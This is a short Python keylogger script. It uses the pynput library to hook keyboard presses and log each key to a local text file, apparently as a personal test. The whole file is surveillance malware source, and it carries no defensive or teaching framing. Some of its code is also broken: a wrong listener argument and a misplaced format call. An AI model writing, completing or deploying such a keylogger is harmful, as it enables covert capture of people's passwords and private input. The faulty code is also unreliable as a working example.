from pynput.keyboard import Key,Listener
import logging

log_dir = ''

logging.basicConfig(filename=(log_dir + "D:\pythonTest\keylogging\log.txt"),
                            level = logging.DEBUG, format='["%(asctime)s", %(message)s]')
def press(key):
    logging.info('"{0}"',format(key))
    
with Listener(press = press) as listener:
    listener.join()